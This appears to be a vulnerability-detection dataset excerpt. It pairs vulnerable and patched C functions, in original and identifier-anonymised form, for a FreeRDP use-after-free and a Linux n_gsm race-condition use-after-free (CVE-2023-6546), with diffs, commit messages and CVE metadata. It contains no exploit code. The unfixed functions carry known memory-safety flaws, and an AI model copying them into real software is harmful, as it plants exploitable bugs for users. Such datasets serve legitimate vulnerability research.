	subWidth = (nSrcWidth / 2) + (nSrcWidth % 2);
	subHeight = (nSrcHeight / 2) + (nSrcHeight % 2);
	planeSize = nSrcWidth * nSrcHeight;
	subSize = subWidth * subHeight;

	if (!cs)
	{
		rawSizes[0] = planeSize; /* LumaOrRedPlane */
		rawWidths[0] = nSrcWidth;
		rawHeights[0] = nSrcHeight;
		rawSizes[1] = planeSize; /* OrangeChromaOrGreenPlane */
		rawWidths[1] = nSrcWidth;
		rawHeights[1] = nSrcHeight;
		rawSizes[2] = planeSize; /* GreenChromaOrBluePlane */
		rawWidths[2] = nSrcWidth;
		rawHeights[2] = nSrcHeight;
		rawSizes[3] = planeSize; /* AlphaPlane */
		rawWidths[3] = nSrcWidth;
		rawHeights[3] = nSrcHeight;
	}
	else /* Chroma Subsampling */
	{
		rawSizes[0] = planeSize; /* LumaOrRedPlane */
		rawWidths[0] = nSrcWidth;
		rawHeights[0] = nSrcHeight;
		rawSizes[1] = subSize; /* OrangeChromaOrGreenPlane */
		rawWidths[1] = subWidth;
		rawHeights[1] = subHeight;
		rawSizes[2] = subSize; /* GreenChromaOrBluePlane */
		rawWidths[2] = subWidth;
		rawHeights[2] = subHeight;
		rawSizes[3] = planeSize; /* AlphaPlane */
		rawWidths[3] = nSrcWidth;
		rawHeights[3] = nSrcHeight;
	}

	if (!rle) /* RAW */
	{
		UINT32 base = planeSize * 3;
		if (cs)
			base = planeSize + planeSize / 2;

		if (alpha)
		{
			if ((SrcSize - (srcp - pSrcData)) < (planeSize + base))
			{
				WLog_ERR(TAG, ""Alpha plane size mismatch %"" PRIu32 "" < %"" PRIu32,
				         SrcSize - (srcp - pSrcData), (planeSize + base));
				return FALSE;
			}

			planes[3] = srcp;                    /* AlphaPlane */
			planes[0] = planes[3] + rawSizes[3]; /* LumaOrRedPlane */
			planes[1] = planes[0] + rawSizes[0]; /* OrangeChromaOrGreenPlane */
			planes[2] = planes[1] + rawSizes[1]; /* GreenChromaOrBluePlane */

			if ((planes[2] + rawSizes[2]) > &pSrcData[SrcSize])
			{
				WLog_ERR(TAG, ""plane size mismatch %p + %"" PRIu32 "" > %p"", planes[2], rawSizes[2],
				         &pSrcData[SrcSize]);
				return FALSE;
			}
		}
		else
		{
			if ((SrcSize - (srcp - pSrcData)) < base)
			{
				WLog_ERR(TAG, ""plane size mismatch %"" PRIu32 "" < %"" PRIu32,
				         SrcSize - (srcp - pSrcData), base);
				return FALSE;
			}

			planes[0] = srcp;                    /* LumaOrRedPlane */
			planes[1] = planes[0] + rawSizes[0]; /* OrangeChromaOrGreenPlane */
			planes[2] = planes[1] + rawSizes[1]; /* GreenChromaOrBluePlane */

			if ((planes[2] + rawSizes[2]) > &pSrcData[SrcSize])
			{
				WLog_ERR(TAG, ""plane size mismatch %p + %"" PRIu32 "" > %p"", planes[2], rawSizes[2],
				         &pSrcData[SrcSize]);
				return FALSE;
			}
		}
	}
	else /* RLE */
	{
		if (alpha)
		{
			planes[3] = srcp;
			rleSizes[3] = planar_skip_plane_rle(planes[3], SrcSize - (planes[3] - pSrcData),
			                                    rawWidths[3], rawHeights[3]); /* AlphaPlane */

			if (rleSizes[3] < 0)
				return FALSE;

			planes[0] = planes[3] + rleSizes[3];
		}
		else
			planes[0] = srcp;

		rleSizes[0] = planar_skip_plane_rle(planes[0], SrcSize - (planes[0] - pSrcData),
		                                    rawWidths[0], rawHeights[0]); /* RedPlane */

		if (rleSizes[0] < 0)
			return FALSE;

		planes[1] = planes[0] + rleSizes[0];
		rleSizes[1] = planar_skip_plane_rle(planes[1], SrcSize - (planes[1] - pSrcData),
		                                    rawWidths[1], rawHeights[1]); /* GreenPlane */

		if (rleSizes[1] < 1)
			return FALSE;

		planes[2] = planes[1] + rleSizes[1];
		rleSizes[2] = planar_skip_plane_rle(planes[2], SrcSize - (planes[2] - pSrcData),
		                                    rawWidths[2], rawHeights[2]); /* BluePlane */

		if (rleSizes[2] < 1)
			return FALSE;
	}

	if (!cll) /* RGB */
	{
		UINT32 TempFormat;
		BYTE* pTempData = pDstData;
		UINT32 nTempStep = nDstStep;
		UINT32 nTotalHeight = nYDst + nDstHeight;

		if (useAlpha)
			TempFormat = PIXEL_FORMAT_BGRA32;
		else
			TempFormat = PIXEL_FORMAT_BGRX32;

		TempFormat = planar_invert_format(planar, alpha, TempFormat);

		if ((TempFormat != DstFormat) || (nSrcWidth != nDstWidth) || (nSrcHeight != nDstHeight))
		{
			pTempData = planar->pTempData;
			nTempStep = planar->nTempStep;
			nTotalHeight = planar->maxHeight;
		}

		if (!rle) /* RAW */
		{
			if (!planar_decompress_planes_raw(planes, pTempData, TempFormat, nTempStep, nXDst,
			                                  nYDst, nSrcWidth, nSrcHeight, vFlip, nTotalHeight))
				return FALSE;

			if (alpha)
				srcp += rawSizes[0] + rawSizes[1] + rawSizes[2] + rawSizes[3];
			else /* NoAlpha */
				srcp += rawSizes[0] + rawSizes[1] + rawSizes[2];

			if ((SrcSize - (srcp - pSrcData)) == 1)
				srcp++; /* pad */
		}
		else /* RLE */
		{
			status =
			    planar_decompress_plane_rle(planes[0], rleSizes[0], pTempData, nTempStep, nXDst,
			                                nYDst, nSrcWidth, nSrcHeight, 2, vFlip); /* RedPlane */

			if (status < 0)
				return FALSE;

			status = planar_decompress_plane_rle(planes[1], rleSizes[1], pTempData, nTempStep,
			                                     nXDst, nYDst, nSrcWidth, nSrcHeight, 1,
			                                     vFlip); /* GreenPlane */

			if (status < 0)
				return FALSE;

			status =
			    planar_decompress_plane_rle(planes[2], rleSizes[2], pTempData, nTempStep, nXDst,
			                                nYDst, nSrcWidth, nSrcHeight, 0, vFlip); /* BluePlane */

			if (status < 0)
				return FALSE;

			srcp += rleSizes[0] + rleSizes[1] + rleSizes[2];

			if (useAlpha)
			{
				status = planar_decompress_plane_rle(planes[3], rleSizes[3], pTempData, nTempStep,
				                                     nXDst, nYDst, nSrcWidth, nSrcHeight, 3,
				                                     vFlip); /* AlphaPlane */
			}
			else
				status = planar_set_plane(0xFF, pTempData, nTempStep, nXDst, nYDst, nSrcWidth,
				                          nSrcHeight, 3, vFlip);

			if (status < 0)
				return FALSE;

			if (alpha)
				srcp += rleSizes[3];
		}

		if (pTempData != pDstData)
		{
			if (!freerdp_image_copy(pDstData, DstFormat, nDstStep, nXDst, nYDst, w, h, pTempData,
			                        TempFormat, nTempStep, nXDst, nYDst, NULL, FREERDP_FLIP_NONE))
			{
				WLog_ERR(TAG, ""planar image copy failed"");
				return FALSE;
			}
		}
	}
	else /* YCoCg */
	{
		UINT32 TempFormat;
		BYTE* pTempData = planar->pTempData;
		UINT32 nTempStep = planar->nTempStep;
		UINT32 nTotalHeight = planar->maxHeight;
		BYTE* dst = &pDstData[nXDst * FreeRDPGetBytesPerPixel(DstFormat) + nYDst * nDstStep];

		if (useAlpha)
			TempFormat = PIXEL_FORMAT_BGRA32;
		else
			TempFormat = PIXEL_FORMAT_BGRX32;

		if (!pTempData)
			return FALSE;

		if (rle) /* RLE encoded data. Decode and handle it like raw data. */
		{
			BYTE* rleBuffer[4] = { 0 };

			if (!planar->rlePlanesBuffer)
				return FALSE;

			rleBuffer[3] = planar->rlePlanesBuffer;  /* AlphaPlane */
			rleBuffer[0] = rleBuffer[3] + planeSize; /* LumaOrRedPlane */
			rleBuffer[1] = rleBuffer[0] + planeSize; /* OrangeChromaOrGreenPlane */
			rleBuffer[2] = rleBuffer[1] + planeSize; /* GreenChromaOrBluePlane */
			if (useAlpha)
			{
				status =
				    planar_decompress_plane_rle_only(planes[3], rleSizes[3], rleBuffer[3],
				                                     rawWidths[3], rawHeights[3]); /* AlphaPlane */

				if (status < 0)
					return FALSE;
			}

			if (alpha)
				srcp += rleSizes[3];

			status = planar_decompress_plane_rle_only(planes[0], rleSizes[0], rleBuffer[0],
			                                          rawWidths[0], rawHeights[0]); /* LumaPlane */

			if (status < 0)
				return FALSE;

			status =
			    planar_decompress_plane_rle_only(planes[1], rleSizes[1], rleBuffer[1], rawWidths[1],
			                                     rawHeights[1]); /* OrangeChromaPlane */

			if (status < 0)
				return FALSE;

			status =
			    planar_decompress_plane_rle_only(planes[2], rleSizes[2], rleBuffer[2], rawWidths[2],
			                                     rawHeights[2]); /* GreenChromaPlane */

			if (status < 0)
				return FALSE;

			planes[0] = rleBuffer[0];
			planes[1] = rleBuffer[1];
			planes[2] = rleBuffer[2];
			planes[3] = rleBuffer[3];
		}

		/* RAW */
		{
			if (cs)
			{ /* Chroma subsampling for Co and Cg:
			   * Each pixel contains the value that should be expanded to
			   * [2x,2y;2x+1,2y;2x+1,2y+1;2x;2y+1] */
				if (!planar_subsample_expand(planes[1], rawSizes[1], nSrcWidth, nSrcHeight,
				                             rawWidths[1], rawHeights[1], planar->deltaPlanes[0]))
					return FALSE;

				planes[1] = planar->deltaPlanes[0];
				rawSizes[1] = planeSize; /* OrangeChromaOrGreenPlane */
				rawWidths[1] = nSrcWidth;
				rawHeights[1] = nSrcHeight;

				if (!planar_subsample_expand(planes[2], rawSizes[2], nSrcWidth, nSrcHeight,
				                             rawWidths[2], rawHeights[2], planar->deltaPlanes[1]))
					return FALSE;

				planes[2] = planar->deltaPlanes[1];
				rawSizes[2] = planeSize; /* GreenChromaOrBluePlane */
				rawWidths[2] = nSrcWidth;
				rawHeights[2] = nSrcHeight;
			}

			if (!planar_decompress_planes_raw(planes, pTempData, TempFormat, nTempStep, nXDst,
			                                  nYDst, nSrcWidth, nSrcHeight, vFlip, nTotalHeight))
				return FALSE;

			if (alpha)
				srcp += rawSizes[0] + rawSizes[1] + rawSizes[2] + rawSizes[3];
			else /* NoAlpha */
				srcp += rawSizes[0] + rawSizes[1] + rawSizes[2];

			if ((SrcSize - (srcp - pSrcData)) == 1)
				srcp++; /* pad */
		}

		WINPR_ASSERT(prims->YCoCgToRGB_8u_AC4R);
		int rc = prims->YCoCgToRGB_8u_AC4R(pTempData, nTempStep, dst, DstFormat, nDstStep, w, h,
		                                   cll, useAlpha);
		if (rc != PRIMITIVES_SUCCESS)
		{
			WLog_ERR(TAG, ""YCoCgToRGB_8u_AC4R failed with %d"", rc);
			return FALSE;
		}
	}

	WINPR_UNUSED(srcp);
	return TRUE;
}","BOOL planar_decompress(BITMAP_PLANAR_CONTEXT* VAR_0, const BYTE* VAR_1, UINT32 VAR_2,
                       UINT32 VAR_3, UINT32 VAR_4, BYTE* VAR_5, UINT32 VAR_6,
                       UINT32 VAR_7, UINT32 VAR_8, UINT32 VAR_9, UINT32 VAR_10,
                       UINT32 VAR_11, BOOL VAR_12)
{
	BOOL VAR_13;
	BOOL VAR_14;
	UINT32 VAR_15;
	BOOL VAR_16;
	BOOL VAR_17 = FALSE;
	INT32 VAR_18;
	const BYTE* VAR_19;
	UINT32 VAR_20;
	UINT32 VAR_21;
	UINT32 VAR_22;
	UINT32 VAR_23;
	INT32 VAR_24[4] = { 0, 0, 0, 0 };
	UINT32 VAR_25[4];
	UINT32 VAR_26[4];
	UINT32 VAR_27[4];
	BYTE VAR_28;
	const BYTE* VAR_29[4] = { 0 };
	const UINT32 VAR_30 = MIN(VAR_3, VAR_10);
	const UINT32 VAR_31 = MIN(VAR_4, VAR_11);
	const primitives_t* VAR_32 = primitives_get();

	WINPR_ASSERT(VAR_0);
	WINPR_ASSERT(VAR_32);

	if (VAR_7 <= 0)
		VAR_7 = VAR_10 * FreeRDPGetBytesPerPixel(VAR_6);

	VAR_19 = VAR_1;

	if (!VAR_1)
	{
		WLog_ERR(VAR_33, ""Invalid argument pSrcData=NULL"");
		return FALSE;
	}

	if (!VAR_5)
	{
		WLog_ERR(VAR_33, ""Invalid argument pDstData=NULL"");
		return FALSE;
	}

	VAR_28 = *VAR_19++;
	VAR_15 = (VAR_28 & VAR_34);
	VAR_13 = (VAR_28 & VAR_35) ? TRUE : FALSE;
	VAR_14 = (VAR_28 & VAR_36) ? TRUE : FALSE;
	VAR_16 = (VAR_28 & VAR_37) ? FALSE : TRUE;

	VAR_6 = planar_invert_format(VAR_0, VAR_16, VAR_6);

	if (VAR_16)
		VAR_17 = FreeRDPColorHasAlpha(VAR_6);

	/* COMMENT_0 */
	/* COMMENT_1 */

	if (!VAR_15 && VAR_13)
	{
		WLog_ERR(VAR_33, ""Chroma subsampling requires YCoCg and does not work with RGB data"");
		return FALSE; /* COMMENT_2 */
	}

	VAR_21 = (VAR_3 / 2) + (VAR_3 % 2);
	VAR_22 = (VAR_4 / 2) + (VAR_4 % 2);
	VAR_23 = VAR_3 * VAR_4;
	VAR_20 = VAR_21 * VAR_22;

	if (!VAR_13)
	{
		VAR_25[0] = VAR_23; /* COMMENT_3 */
		VAR_26[0] = VAR_3;
		VAR_27[0] = VAR_4;
		VAR_25[1] = VAR_23; /* COMMENT_4 */
		VAR_26[1] = VAR_3;
		VAR_27[1] = VAR_4;
		VAR_25[2] = VAR_23; /* COMMENT_5 */
		VAR_26[2] = VAR_3;
		VAR_27[2] = VAR_4;
		VAR_25[3] = VAR_23; /* COMMENT_6 */
		VAR_26[3] = VAR_3;
		VAR_27[3] = VAR_4;
	}
	else /* COMMENT_7 */
	{
		VAR_25[0] = VAR_23; /* COMMENT_3 */
		VAR_26[0] = VAR_3;
		VAR_27[0] = VAR_4;
		VAR_25[1] = VAR_20; /* COMMENT_4 */
		VAR_26[1] = VAR_21;
		VAR_27[1] = VAR_22;
		VAR_25[2] = VAR_20; /* COMMENT_5 */
		VAR_26[2] = VAR_21;
		VAR_27[2] = VAR_22;
		VAR_25[3] = VAR_23; /* COMMENT_6 */
		VAR_26[3] = VAR_3;
		VAR_27[3] = VAR_4;
	}

	if (!VAR_14) /* COMMENT_8 */
	{
		UINT32 VAR_38 = VAR_23 * 3;
		if (VAR_13)
			VAR_38 = VAR_23 + VAR_23 / 2;

		if (VAR_16)
		{
			if ((VAR_2 - (VAR_19 - VAR_1)) < (VAR_23 + VAR_38))
			{
				WLog_ERR(VAR_33, ""Alpha plane size mismatch %"" VAR_39 "" < %"" VAR_39,
				         VAR_2 - (VAR_19 - VAR_1), (VAR_23 + VAR_38));
				return FALSE;
			}

			VAR_29[3] = VAR_19;                    /* COMMENT_6 */
			VAR_29[0] = VAR_29[3] + VAR_25[3]; /* COMMENT_3 */
			VAR_29[1] = VAR_29[0] + VAR_25[0]; /* COMMENT_4 */
			VAR_29[2] = VAR_29[1] + VAR_25[1]; /* COMMENT_5 */

			if ((VAR_29[2] + VAR_25[2]) > &VAR_1[VAR_2])
			{
				WLog_ERR(VAR_33, ""plane size mismatch %p + %"" VAR_39 "" > %p"", VAR_29[2], VAR_25[2],
				         &VAR_1[VAR_2]);
				return FALSE;
			}
		}
		else
		{
			if ((VAR_2 - (VAR_19 - VAR_1)) < VAR_38)
			{
				WLog_ERR(VAR_33, ""plane size mismatch %"" VAR_39 "" < %"" VAR_39,
				         VAR_2 - (VAR_19 - VAR_1), VAR_38);
				return FALSE;
			}

			VAR_29[0] = VAR_19;                    /* COMMENT_3 */
			VAR_29[1] = VAR_29[0] + VAR_25[0]; /* COMMENT_4 */
			VAR_29[2] = VAR_29[1] + VAR_25[1]; /* COMMENT_5 */

			if ((VAR_29[2] + VAR_25[2]) > &VAR_1[VAR_2])
			{
				WLog_ERR(VAR_33, ""plane size mismatch %p + %"" VAR_39 "" > %p"", VAR_29[2], VAR_25[2],
				         &VAR_1[VAR_2]);
				return FALSE;
			}
		}
	}
	else /* COMMENT_9 */
	{
		if (VAR_16)
		{
			VAR_29[3] = VAR_19;
			VAR_24[3] = planar_skip_plane_rle(VAR_29[3], VAR_2 - (VAR_29[3] - VAR_1),
			                                    VAR_26[3], VAR_27[3]); /* COMMENT_6 */

			if (VAR_24[3] < 0)
				return FALSE;

			VAR_29[0] = VAR_29[3] + VAR_24[3];
		}
		else
			VAR_29[0] = VAR_19;

		VAR_24[0] = planar_skip_plane_rle(VAR_29[0], VAR_2 - (VAR_29[0] - VAR_1),
		                                    VAR_26[0], VAR_27[0]); /* COMMENT_10 */

		if (VAR_24[0] < 0)
			return FALSE;

		VAR_29[1] = VAR_29[0] + VAR_24[0];
		VAR_24[1] = planar_skip_plane_rle(VAR_29[1], VAR_2 - (VAR_29[1] - VAR_1),
		                                    VAR_26[1], VAR_27[1]); /* COMMENT_11 */

		if (VAR_24[1] < 1)
			return FALSE;

		VAR_29[2] = VAR_29[1] + VAR_24[1];
		VAR_24[2] = planar_skip_plane_rle(VAR_29[2], VAR_2 - (VAR_29[2] - VAR_1),
		                                    VAR_26[2], VAR_27[2]); /* COMMENT_12 */

		if (VAR_24[2] < 1)
			return FALSE;
	}

	if (!VAR_15) /* COMMENT_13 */
	{
		UINT32 VAR_40;
		BYTE* VAR_41 = VAR_5;
		UINT32 VAR_42 = VAR_7;
		UINT32 VAR_43 = VAR_9 + VAR_11;

		if (VAR_17)
			VAR_40 = VAR_44;
		else
			VAR_40 = VAR_45;

		VAR_40 = planar_invert_format(VAR_0, VAR_16, VAR_40);

		if ((VAR_40 != VAR_6) || (VAR_3 != VAR_10) || (VAR_4 != VAR_11))
		{
			VAR_41 = VAR_0->pTempData;
			VAR_42 = VAR_0->nTempStep;
			VAR_43 = VAR_0->maxHeight;
		}

		if (!VAR_14) /* COMMENT_8 */
		{
			if (!planar_decompress_planes_raw(VAR_29, VAR_41, VAR_40, VAR_42, VAR_8,
			                                  VAR_9, VAR_3, VAR_4, VAR_12, VAR_43))
				return FALSE;

			if (VAR_16)
				VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2] + VAR_25[3];
			else /* COMMENT_14 */
				VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2];

			if ((VAR_2 - (VAR_19 - VAR_1)) == 1)
				VAR_19++; /* COMMENT_15 */
		}
		else /* COMMENT_9 */
		{
			VAR_18 =
			    planar_decompress_plane_rle(VAR_29[0], VAR_24[0], VAR_41, VAR_42, VAR_8,
			                                VAR_9, VAR_3, VAR_4, 2, VAR_12); /* COMMENT_10 */

			if (VAR_18 < 0)
				return FALSE;

			VAR_18 = planar_decompress_plane_rle(VAR_29[1], VAR_24[1], VAR_41, VAR_42,
			                                     VAR_8, VAR_9, VAR_3, VAR_4, 1,
			                                     VAR_12); /* COMMENT_11 */

			if (VAR_18 < 0)
				return FALSE;

			VAR_18 =
			    planar_decompress_plane_rle(VAR_29[2], VAR_24[2], VAR_41, VAR_42, VAR_8,
			                                VAR_9, VAR_3, VAR_4, 0, VAR_12); /* COMMENT_12 */

			if (VAR_18 < 0)
				return FALSE;

			VAR_19 += VAR_24[0] + VAR_24[1] + VAR_24[2];

			if (VAR_17)
			{
				VAR_18 = planar_decompress_plane_rle(VAR_29[3], VAR_24[3], VAR_41, VAR_42,
				                                     VAR_8, VAR_9, VAR_3, VAR_4, 3,
				                                     VAR_12); /* COMMENT_6 */
			}
			else
				VAR_18 = planar_set_plane(0xFF, VAR_41, VAR_42, VAR_8, VAR_9, VAR_3,
				                          VAR_4, 3, VAR_12);

			if (VAR_18 < 0)
				return FALSE;

			if (VAR_16)
				VAR_19 += VAR_24[3];
		}

		if (VAR_41 != VAR_5)
		{
			if (!freerdp_image_copy(VAR_5, VAR_6, VAR_7, VAR_8, VAR_9, VAR_30, VAR_31, VAR_41,
			                        VAR_40, VAR_42, VAR_8, VAR_9, NULL, VAR_46))
			{
				WLog_ERR(VAR_33, ""planar image copy failed"");
				return FALSE;
			}
		}
	}
	else /* COMMENT_16 */
	{
		UINT32 VAR_40;
		BYTE* VAR_41 = VAR_0->pTempData;
		UINT32 VAR_42 = VAR_0->nTempStep;
		UINT32 VAR_43 = VAR_0->maxHeight;
		BYTE* VAR_47 = &VAR_5[VAR_8 * FreeRDPGetBytesPerPixel(VAR_6) + VAR_9 * VAR_7];

		if (VAR_17)
			VAR_40 = VAR_44;
		else
			VAR_40 = VAR_45;

		if (!VAR_41)
			return FALSE;

		if (VAR_14) /* COMMENT_17 */
		{
			BYTE* VAR_48[4] = { 0 };

			if (!VAR_0->rlePlanesBuffer)
				return FALSE;

			VAR_48[3] = VAR_0->rlePlanesBuffer;  /* COMMENT_6 */
			VAR_48[0] = VAR_48[3] + VAR_23; /* COMMENT_3 */
			VAR_48[1] = VAR_48[0] + VAR_23; /* COMMENT_4 */
			VAR_48[2] = VAR_48[1] + VAR_23; /* COMMENT_5 */
			if (VAR_17)
			{
				VAR_18 =
				    planar_decompress_plane_rle_only(VAR_29[3], VAR_24[3], VAR_48[3],
				                                     VAR_26[3], VAR_27[3]); /* COMMENT_6 */

				if (VAR_18 < 0)
					return FALSE;
			}

			if (VAR_16)
				VAR_19 += VAR_24[3];

			VAR_18 = planar_decompress_plane_rle_only(VAR_29[0], VAR_24[0], VAR_48[0],
			                                          VAR_26[0], VAR_27[0]); /* COMMENT_18 */

			if (VAR_18 < 0)
				return FALSE;

			VAR_18 =
			    planar_decompress_plane_rle_only(VAR_29[1], VAR_24[1], VAR_48[1], VAR_26[1],
			                                     VAR_27[1]); /* COMMENT_19 */

			if (VAR_18 < 0)
				return FALSE;

			VAR_18 =
			    planar_decompress_plane_rle_only(VAR_29[2], VAR_24[2], VAR_48[2], VAR_26[2],
			                                     VAR_27[2]); /* COMMENT_20 */

			if (VAR_18 < 0)
				return FALSE;

			VAR_29[0] = VAR_48[0];
			VAR_29[1] = VAR_48[1];
			VAR_29[2] = VAR_48[2];
			VAR_29[3] = VAR_48[3];
		}

		/* COMMENT_8 */
		{
			if (VAR_13)
			{ /* COMMENT_21 */
                                                                
                                            
				if (!planar_subsample_expand(VAR_29[1], VAR_25[1], VAR_3, VAR_4,
				                             VAR_26[1], VAR_27[1], VAR_0->deltaPlanes[0]))
					return FALSE;

				VAR_29[1] = VAR_0->deltaPlanes[0];
				VAR_25[1] = VAR_23; /* COMMENT_4 */
				VAR_26[1] = VAR_3;
				VAR_27[1] = VAR_4;

				if (!planar_subsample_expand(VAR_29[2], VAR_25[2], VAR_3, VAR_4,
				                             VAR_26[2], VAR_27[2], VAR_0->deltaPlanes[1]))
					return FALSE;

				VAR_29[2] = VAR_0->deltaPlanes[1];
				VAR_25[2] = VAR_23; /* COMMENT_5 */
				VAR_26[2] = VAR_3;
				VAR_27[2] = VAR_4;
			}

			if (!planar_decompress_planes_raw(VAR_29, VAR_41, VAR_40, VAR_42, VAR_8,
			                                  VAR_9, VAR_3, VAR_4, VAR_12, VAR_43))
				return FALSE;

			if (VAR_16)
				VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2] + VAR_25[3];
			else /* COMMENT_14 */
				VAR_19 += VAR_25[0] + VAR_25[1] + VAR_25[2];

			if ((VAR_2 - (VAR_19 - VAR_1)) == 1)
				VAR_19++; /* COMMENT_15 */
		}

		WINPR_ASSERT(VAR_32->YCoCgToRGB_8u_AC4R);
		int VAR_49 = VAR_32->YCoCgToRGB_8u_AC4R(VAR_41, VAR_42, VAR_47, VAR_6, VAR_7, VAR_30, VAR_31,
		                                   VAR_15, VAR_17);
		if (VAR_49 != VAR_50)
		{
			WLog_ERR(VAR_33, ""YCoCgToRGB_8u_AC4R failed with %d"", VAR_49);
			return FALSE;
		}
	}

	WINPR_UNUSED(VAR_19);
	return TRUE;
}",FreeRDP/d6f9d33a7db0b346195b6a15b5b99944ba41beee/planar.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -286,13 +286,14 @@
 			TempFormat = PIXEL_FORMAT_BGRX32;
 
 		if (!pTempData)
-		{
-			return FALSE;
-		}
+			return FALSE;
 
 		if (rle) /* RLE encoded data. Decode and handle it like raw data. */
 		{
 			BYTE* rleBuffer[4] = { 0 };
+
+			if (!planar->rlePlanesBuffer)
+				return FALSE;
 
 			rleBuffer[3] = planar->rlePlanesBuffer;  /* AlphaPlane */
 			rleBuffer[0] = rleBuffer[3] + planeSize; /* LumaOrRedPlane */","{'deleted_lines': ['\t\t{', '\t\t\treturn FALSE;', '\t\t}'], 'added_lines': ['\t\t\treturn FALSE;', '', '\t\t\tif (!planar->rlePlanesBuffer)', '\t\t\t\treturn FALSE;']}",True,"FreeRDP is a free implementation of the Remote Desktop Protocol (RDP), released under the Apache license. Versions of FreeRDP on the 3.x release branch before beta3 are subject to a Use-After-Free in processing `RDPGFX_CMDID_RESETGRAPHICS` packets. If `context->maxPlaneSize` is 0, `context->planesBuffer` will be freed. However, without updating `context->planesBuffer`, this leads to a Use-After-Free exploit vector. In most environments this should only result in a crash. This issue has been addressed in version 3.0.0-beta3 and users of the beta 3.x releases are advised to upgrade. There are no known workarounds for this vulnerability.",7.0,HIGH,2,valid,2023-08-05T08:15:41Z,4
CVE-2023-6546,['CWE-362'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H,1,torvalds/linux,"tty: n_gsm: fix the UAF caused by race condition in gsm_cleanup_mux

In commit 9b9c8195f3f0 (""tty: n_gsm: fix UAF in gsm_cleanup_mux""), the UAF
problem is not completely fixed. There is a race condition in
gsm_cleanup_mux(), which caused this UAF.

The UAF problem is triggered by the following race:
task[5046]                     task[5054]
-----------------------        -----------------------
gsm_cleanup_mux();
dlci = gsm->dlci[0];
mutex_lock(&gsm->mutex);
                               gsm_cleanup_mux();
			       dlci = gsm->dlci[0]; //Didn't take the lock
gsm_dlci_release(gsm->dlci[i]);
gsm->dlci[i] = NULL;
mutex_unlock(&gsm->mutex);
                               mutex_lock(&gsm->mutex);
			       dlci->dead = true; //UAF

Fix it by assigning values after mutex_lock().

Link: https://syzkaller.appspot.com/text?tag=CrashReport&x=176188b5a80000
Cc: stable <stable@kernel.org>
Fixes: 9b9c8195f3f0 (""tty: n_gsm: fix UAF in gsm_cleanup_mux"")
Fixes: aa371e96f05d (""tty: n_gsm: fix restart handling via CLD command"")
Signed-off-by: Yi Yang <yiyang13@huawei.com>
Co-developed-by: Qiumiao Zhang <zhangqiumiao1@huawei.com>
Signed-off-by: Qiumiao Zhang <zhangqiumiao1@huawei.com>
Link: https://lore.kernel.org/r/20230811031121.153237-1-yiyang13@huawei.com
Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",3c4f8333b582487a2d1e02171f1465531cde53e3,https://github.com/torvalds/linux/commit/3c4f8333b582487a2d1e02171f1465531cde53e3,drivers/tty/n_gsm.c,gsm_cleanup_mux,"static void gsm_cleanup_mux(struct gsm_mux *gsm, bool disc)
{
int i;
struct gsm_dlci *dlci = gsm->dlci[0];
struct gsm_msg *txq, *ntxq;
gsm->dead = true;
mutex_lock(&gsm->mutex);
if (dlci) {
if (disc && dlci->state != DLCI_CLOSED) {
gsm_dlci_begin_close(dlci);
wait_event(gsm->event, dlci->state == DLCI_CLOSED);
}
dlci->dead = true;
}
del_timer_sync(&gsm->kick_timer);
del_timer_sync(&gsm->t2_timer);
del_timer_sync(&gsm->ka_timer);
flush_work(&gsm->tx_work);
if (gsm->has_devices) {
gsm_unregister_devices(gsm_tty_driver, gsm->num);
gsm->has_devices = false;
}
for (i = NUM_DLCI - 1; i >= 0; i--)
if (gsm->dlci[i]) {
gsm_dlci_release(gsm->dlci[i]);
gsm->dlci[i] = NULL;
}
mutex_unlock(&gsm->mutex);
tty_ldisc_flush(gsm->tty);
list_for_each_entry_safe(txq, ntxq, &gsm->tx_ctrl_list, list)
kfree(txq);
INIT_LIST_HEAD(&gsm->tx_ctrl_list);
list_for_each_entry_safe(txq, ntxq, &gsm->tx_data_list, list)
kfree(txq);
INIT_LIST_HEAD(&gsm->tx_data_list);
}","static void gsm_cleanup_mux(struct gsm_mux *VAR_0, bool VAR_1)
{
int VAR_2;
struct gsm_dlci *VAR_3 = VAR_0->dlci[0];
struct gsm_msg *VAR_4, *VAR_5;
VAR_0->dead = true;
mutex_lock(&VAR_0->mutex);
if (VAR_3) {
if (VAR_1 && VAR_3->state != VAR_6) {
gsm_dlci_begin_close(VAR_3);
wait_event(VAR_0->event, VAR_3->state == VAR_6);
}
VAR_3->dead = true;
}
del_timer_sync(&VAR_0->kick_timer);
del_timer_sync(&VAR_0->t2_timer);
del_timer_sync(&VAR_0->ka_timer);
flush_work(&VAR_0->tx_work);
if (VAR_0->has_devices) {
gsm_unregister_devices(VAR_7, VAR_0->num);
VAR_0->has_devices = false;
}
for (VAR_2 = VAR_8 - 1; VAR_2 >= 0; VAR_2--)
if (VAR_0->dlci[VAR_2]) {
gsm_dlci_release(VAR_0->dlci[VAR_2]);
VAR_0->dlci[VAR_2] = NULL;
}
mutex_unlock(&VAR_0->mutex);
tty_ldisc_flush(VAR_0->tty);
list_for_each_entry_safe(VAR_4, VAR_5, &VAR_0->tx_ctrl_list, VAR_9)
kfree(VAR_4);
INIT_LIST_HEAD(&VAR_0->tx_ctrl_list);
list_for_each_entry_safe(VAR_4, VAR_5, &VAR_0->tx_data_list, VAR_9)
kfree(VAR_4);
INIT_LIST_HEAD(&VAR_0->tx_data_list);
}",torvalds/linux/3c4f8333b582487a2d1e02171f1465531cde53e3/n_gsm.c/vul/before/0.json,"static void gsm_cleanup_mux(struct gsm_mux *gsm, bool disc)
{
	int i;
	struct gsm_dlci *dlci;
	struct gsm_msg *txq, *ntxq;

	gsm->dead = true;
	mutex_lock(&gsm->mutex);

	dlci = gsm->dlci[0];
	if (dlci) {
		if (disc && dlci->state != DLCI_CLOSED) {
			gsm_dlci_begin_close(dlci);
			wait_event(gsm->event, dlci->state == DLCI_CLOSED);
		}
		dlci->dead = true;
	}

	/* Finish outstanding timers, making sure they are done */
	del_timer_sync(&gsm->kick_timer);
	del_timer_sync(&gsm->t2_timer);
	del_timer_sync(&gsm->ka_timer);

	/* Finish writing to ldisc */
	flush_work(&gsm->tx_work);

	/* Free up any link layer users and finally the control channel */
	if (gsm->has_devices) {
		gsm_unregister_devices(gsm_tty_driver, gsm->num);
		gsm->has_devices = false;
	}
